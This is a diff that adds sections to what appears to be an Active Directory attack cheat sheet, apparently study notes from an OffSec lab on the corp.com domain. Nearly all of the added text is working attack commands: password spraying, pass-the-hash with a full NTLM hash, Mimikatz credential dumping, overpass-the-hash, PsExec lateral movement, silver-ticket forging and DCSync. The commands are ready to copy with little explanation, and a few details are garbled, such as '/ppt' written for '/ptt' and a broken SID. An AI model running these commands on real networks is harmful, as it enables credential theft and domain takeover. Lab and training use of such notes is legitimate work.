@@ -130,3 +130,69 @@ Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out
 
 ```
 
+#### Low and Slow Password guessing
+
+```
+net accounts
+
+.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+.\Spray-Passwords.ps1 -File pass.txt -Admin
+```
+### Lateral movement
+
+#### Pass the Hash
+
+```
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+```
+
+#### Overpass the Hash
+
+```
+sekurlsa::logonpasswords
+
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+klist - no ticket listed
+
+net use \\dc01
+
+klist - ticket listed after net use
+
+ .\PsExec.exe \\dc01 cmd.exe
+
+ipconfig
+
+whoami
+```
+https://download.sysinternals.com/files/PSTools.zip
+
+
+#### Pass the Ticket
+
+  get the SID
+
+`whoami /user` 
+
+purge kerberos ticket
+
+```
+kerberos::purge
+
+kerberos::list
+```
+
+The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), which is highlighted above, the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4).Finally, the generated silver ticket is injected directly into memory with the /ppt flag.
+
+```
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+kerberos::list
+
+```
+
+lsadump::dcsync /user:corp\iis_service
+
+kerberos::hash /password:puttheservicepasswordhere
+
+
